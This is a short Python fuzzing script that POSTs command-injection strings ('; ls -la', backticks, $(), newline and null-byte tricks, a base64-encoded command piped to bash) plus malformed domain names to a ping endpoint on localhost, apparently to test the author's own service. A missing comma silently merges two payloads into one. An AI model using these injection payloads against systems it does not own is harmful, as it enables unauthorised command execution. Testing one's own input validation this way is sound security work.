import requests

target = "http://localhost:3000/ping"
payloads = [
    "mercadona.es",
    "mercadona.es | ls -la",
    "mercadona.es; ls -la",
    "mercadona.es && ls -la"
    "mercadona.es; bHMgLWE=",
    "a.b.c.d.e.f.g.h.i.j.k.mercadona.es",
    "sub..mercadona.es",
    "192.168.1.999",
    "a" * 63 + ".b" * 63 + ".c" * 63 + ".d" * 63 + ".es",
    "xn--fiq228c.com",
    "mercadona.es\nls -la",
    "mercadona.es\u0000; ls -la",
    "a" * 10000 + ".es",
    "-mercadona.es",
    "mercadona-.es",
    ".mercadona.es",
    "mercadona.es.",
    "mercadona.es\x08",
    "mercadona.esé",
    "mercadona.es𝔘",
    "mercadona–es.com",
    "mercadona.es `ls -la`",
    "mercadona.es%20;ls%20-la",
    "echo bHMgLWE= | base64 -d | bash",
    "mercadona.es;$(printf%20'ls%20-la')",
    "a" * 2000 + "; ls -la",
    "mercadona.es; ls -la #",
    "$(ls -la)",
    "mercadona.es\\; ls -la"
]

for payload in payloads:
    print("Intentando inyectar", payload)
    r = requests.post(target, json={"host": payload})
    print(r.text)

